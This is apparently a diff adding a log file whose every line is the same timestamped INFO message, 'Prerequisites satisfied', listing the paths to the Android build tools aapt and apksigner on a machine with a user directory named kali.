+[2026-03-06 10:45:35] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 10:45:39] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 10:45:44] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 10:45:50] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 10:45:55] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 10:46:01] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 10:46:06] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 10:46:10] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 10:46:16] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 10:46:19] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 10:46:25] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 10:48:45] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 10:50:03] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 10:52:18] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 10:52:27] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 10:52:32] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 10:52:36] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 10:53:21] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 10:53:25] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 10:53:43] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 10:54:06] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 10:54:24] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 10:57:11] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 10:57:27] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 10:57:27] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 11:10:44] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 11:10:57] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 11:11:05] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 11:11:31] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 11:11:58] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 11:15:12] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 11:15:26] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 11:15:53] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 11:16:10] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 11:16:28] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 11:26:03] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 11:26:20] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 11:26:31] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 11:31:41] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 11:42:50] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 11:42:59] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 11:43:12] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 11:43:17] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 11:43:52] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 11:43:56] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 12:06:46] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 12:07:08] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 12:07:13] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 12:21:18] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 12:21:45] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 12:23:05] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 12:23:14] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 12:24:48] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 12:25:29] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 12:46:15] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 12:46:16] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 12:47:20] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 17:24:53] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 17:24:55] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 17:31:41] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 17:32:16] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 17:32:47] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 17:34:21] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 17:34:35] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 17:36:51] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 17:37:19] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 17:37:58] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 17:38:19] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 17:38:24] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 17:38:29] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 17:38:35] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 17:38:41] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 17:43:43] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 17:46:24] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 17:47:20] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 17:49:13] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 17:49:37] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 17:51:09] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 17:51:28] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 17:51:57] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 17:52:18] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 17:54:38] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 17:55:12] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 17:55:29] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 17:55:34] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 17:55:45] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 17:56:30] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 17:56:45] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 17:57:08] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 17:57:14] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 17:57:21] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 17:57:28] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 17:57:34] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 17:57:42] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 17:57:48] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 17:57:54] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 17:58:00] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 17:58:07] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 17:58:16] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 17:58:24] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 17:58:49] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 18:01:56] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 18:02:12] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 18:02:37] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 18:02:46] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 18:02:47] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 18:02:53] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 18:02:56] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 18:03:04] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 18:03:26] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 18:03:51] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 18:03:52] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 18:04:50] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 18:05:22] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 18:05:29] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 18:05:53] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 18:05:56] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 18:06:16] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 18:06:42] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 19:11:28] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 19:11:36] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 19:11:48] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 19:11:53] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 19:11:56] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 19:11:59] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 19:12:02] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 19:12:05] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 19:12:08] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 19:12:10] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 19:12:14] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 19:12:18] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 19:12:25] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 19:19:50] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 19:20:02] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 19:20:10] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
